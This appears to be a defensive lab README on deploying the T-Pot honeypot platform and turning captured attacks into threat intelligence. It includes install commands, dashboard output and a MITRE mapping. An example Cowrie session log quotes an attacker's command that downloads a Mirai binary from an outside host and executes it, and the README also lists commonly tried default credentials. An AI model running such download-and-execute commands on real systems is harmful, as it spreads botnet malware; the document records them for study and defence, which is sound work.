> **English** | [Italiano](README.md)

# T-Pot - Multi-Service Honeypot Platform

> - **Phase:** Defense & Hardening - Deception & Threat Intelligence
> - **Category:** Deception - high-interaction honeypot and threat intel collection
> - **Prerequisites:** Dedicated VM (8-16 GB RAM, T-Pot is demanding: it runs dozens of Docker containers); isolated network/DMZ; exposed IP or monitored segment; never on a production network
> - **Output:** Finding DEF-006; collection of real TTPs and IOCs; attack visualization dashboard; intelligence on who attacks and how

- **Operating Environment:** Dedicated isolated VM (T-Pot on Debian), separate network segment
- **Role:** "The Traps" - an entire decoy infrastructure to study attackers
- **Main tools:** T-Pot (Deutsche Telekom), Cowrie, Dionaea, Suricata, integrated ELK

---

## Executive Summary

Where the canary token (`../canary-tokens/`) is a single passive decoy, T-Pot is an entire decoy infrastructure. It is an all-in-one honeypot platform developed by Deutsche Telekom that orchestrates dozens of specialized honeypots in Docker containers: Cowrie (SSH/Telnet), Dionaea (malware/SMB), Honeytrap, Elasticpot and many others, with an integrated ELK dashboard that visualizes the attacks in real time on a world map.

T-Pot's purpose is not to defend a real service but to study attackers. By exposing decoy services that look vulnerable, T-Pot attracts attacks and records every detail: which IPs attack, which credentials they try, which exploits they launch, which malware they attempt to deposit. Finding DEF-006 documents this threat intelligence capability: converting the received attacks into operational knowledge (IOCs, TTPs) usable to strengthen the real defenses.

A honeypot has, by definition, a very low false-positive rate, like the canary token: no legitimate user has a reason to connect to a decoy service, so every interaction is potentially hostile. The difference is depth: where the token records a single event (decoy touched), T-Pot records the entire attack session, offering an observatory into the real behavior of adversaries.

---

## Folder Structure

```
t-pot/
+-- README.md      # this file: honeypot platform and threat intel (DEF-006)
+-- img/           # attack map dashboard and Cowrie sessions
```

---

## Deployment and Threat Intelligence with T-Pot

**Finding ID:** `DEF-006` | **Severity:** `Medium` (threat intelligence collection; the honeypot does not protect but generates real and high-confidence IOCs/TTPs)

### Operational Context

T-Pot must be deployed on a dedicated and isolated VM: being designed to be attacked, it must never share the network with production systems. It exposes a deliberately enticing attack surface; the attacks it receives (especially if it has a public IP) are largely opportunistic scans and botnets, but they provide a realistic snapshot of the hostile "background noise" of the Internet.

### PoC - Installation (isolated)

```Bash
# On a dedicated Debian VM, isolated network
git clone https://github.com/telekom-security/tpotce
cd tpotce
sudo ./install.sh                 # select the installation type (STANDARD/SENSOR)
# T-Pot starts dozens of honeypot containers + ELK dashboard
```

```Bash
# Verify the active honeypot services
docker ps --format '{{.Names}}' | head
```

```
cowrie          <-- SSH/Telnet honeypot
dionaea         <-- malware/SMB honeypot
suricata        <-- integrated IDS
elasticsearch   <-- storage for the dashboard
```

### PoC - Capture of an attack session (Cowrie SSH)

```
# Cowrie records a complete SSH session: credentials, commands, files
[cowrie session] src_ip=193.201.x.x
  login attempt: root/admin -> FAILED
  login attempt: root/root  -> SUCCESS (honeypot accepts)   <-- attacker "inside"
  cmd: uname -a; wget http://x.x.x.x/mirai.arm -O /tmp/x    <-- malware deploy attempt (DEF-006)
  cmd: chmod +x /tmp/x; ./x
  downloaded sample: mirai.arm (hash sha256: ...)           <-- IOC captured
```

### PoC - Threat intelligence from the dashboard

```
# The T-Pot ELK dashboard aggregates the attacks:
Top attacker IPs        : 193.201.x.x, 45.83.x.x, ...       <-- IOC (hostile IPs)
Top credentials tried   : root/root, admin/admin, root/123456
Top CVE probed          : CVE-2021-44228 (Log4Shell), ...   <-- TTP (attempted exploits)
Malware samples captured : N samples -> analysis in 09-forensics
```

### Tuning and Defensive Operations

- **Absolute isolation:** T-Pot goes on a separate network, never in production; a honeypot compromised beyond the containment layer becomes a springboard for the attacker
- **Use of the intelligence:** the collected IOCs (IPs, malware hashes, credentials) go into the blocklists and the rules of the real SIEM (`../../../01-siem-log-analysis/`); this is the operational value
- **Maintenance:** T-Pot is resource-hungry and must be kept updated; the captured malware samples must be handled with caution (analysis in a sandboxed environment, see `09-digital-forensics`)
- **Expectations:** with a public IP it receives opportunistic traffic (botnets, mass scanning); for targeted intelligence on a specific adversary, an internal deployment as a decoy (lateral movement detection) is needed

---

## Lab Experience

The first lesson was the resource cost. T-Pot starts dozens of Docker containers simultaneously, and the initial VM (4 GB RAM) was insufficient: the containers crashed in a chain. Bringing the VM to 12 GB, the platform stabilized. It is the same pattern already seen with Wazuh Indexer and Elasticsearch - the ELK/OpenSearch-based defensive tools are structurally memory-hungry.

The most instructive experience was reading the Cowrie sessions. Seeing the attackers (largely automated botnets) enter the honeypot, try the usual weak credentials (`root/root`, `admin/admin`) and then immediately attempt to download and execute Mirai IoT malware made the hostile "background noise" of the Internet concrete. It was not a targeted attack, it was the constant and automated flow that hits any exposed IP. This both resized and clarified the threat: most attacks are not sophisticated, they are volume.

The strategic reflection was on the value of the produced intelligence. The captured IPs and hashes were not academic curiosities: fed into the SIEM as blocklists, they became concrete defense for the real systems. This closed the loop of deception - the honeypot converts the attacks it suffers into knowledge that protects the rest of the infrastructure. The trap does not defend itself, it arms the other defenses.

---

## Theoretical Analysis: The Honeypot as an Intelligence Sensor, not as a Defense

A honeypot protects nothing: it is a system designed to be compromised. Its value is not defensive in a direct sense but informational - it is an intelligence sensor. This distinction is fundamental: whoever expects a honeypot to "stop" attacks misunderstands its purpose. The honeypot observes, records, learns; the real defense happens elsewhere, fueled by what the honeypot has learned.

The foundation is the same as the canary token: null legitimate activity, therefore very high confidence. But T-Pot adds the dimension of behavioral depth. A token says "someone touched the decoy"; a high-interaction honeypot like Cowrie says "the attacker tried these credentials, executed these commands, attempted to download this malware from this IP". It moves from the binary signal (touched/not touched) to the complete recording of the adversary's TTPs (Tactics, Techniques, Procedures).

This places the honeypot in the threat intelligence cycle: collection (the suffered attack), analysis (extracted TTPs and IOCs), action (blocklists, SIEM rules, targeted hardening). The honeypot is the collection point of this cycle, where attacks become data and data becomes defense. Its limit - it requires being attacked to produce value - is also its strength: it records real, not hypothetical, threats, offering a ground truth about the attack landscape that no theoretical analysis can substitute.

---

## Reference Tools

| Tool | Type | Role | Main use case |
| :--- | :--- | :--- | :--- |
| `T-Pot` (Telekom) | Honeypot platform | Platform | All-in-one orchestration of multiple honeypots + dashboard |
| `Cowrie` | SSH/Telnet honeypot | Container | Captures SSH sessions: credentials, commands, malware |
| `Dionaea` | Malware honeypot | Container | Malware capture via SMB/FTP/other services |
| `Suricata` | IDS | Container | Network detection on the received attacks |
| `ELK` (integrated) | Dashboard | Stack | Visualization and analysis of the attacks (attack map) |
| `OpenCanary` | Lightweight honeypot | Alternative | Lightweight honeypot for targeted internal deployments |

> **Recommended modern tool:** `T-Pot` remains the reference platform for a rich and visual honeypot, ideal for research and learning. For a targeted internal deployment (decoy to detect lateral movement, not to collect noise from the Internet), a lightweight honeypot like `OpenCanary` or Active Directory honeytokens are more suitable and less demanding. The collected IOCs feed the SIEM (`../../../01-siem-log-analysis/`).

---

## MITRE ATT&CK Mapping

> The table maps the attack techniques that the honeypot **observes and records** from the attackers.

| Tactic (observed) | Technique | MITRE ID | Role of the control |
| :--- | :--- | :--- | :--- |
| Credential Access | Brute Force | `T1110` | Cowrie records the attempted credentials (DEF-006) |
| Initial Access | Valid Accounts / Exploit Public-Facing App | `T1078` / `T1190` | The honeypot records accesses and attempted exploits (DEF-006) |
| Command and Control | Ingress Tool Transfer | `T1105` | Capture of the malware the attacker attempts to download (DEF-006) |
| Execution | Command and Scripting Interpreter | `T1059` | Recording of the commands executed in the decoy session |

| Defensive countermeasure (D3FEND) | D3FEND ID | Application |
| :--- | :--- | :--- |
| Decoy Environment | `D3-DE` | Complete decoy environment to observe the attacker |
| Decoy Network Resource | `D3-DNR` | Decoy network services (SSH, SMB, HTTP) |
| Connected Honeynet | `D3-CHN` | Network of interconnected honeypots (T-Pot) |

---

> **Note:** T-Pot must be deployed exclusively on isolated networks owned by the author, never in production or on third-party networks. A honeypot captures real malware: the samples must be handled in a sandboxed environment and never executed outside the containment. The collection of data on attackers must comply with applicable regulations. Techniques are documented for educational and defensive purposes in an authorized context.
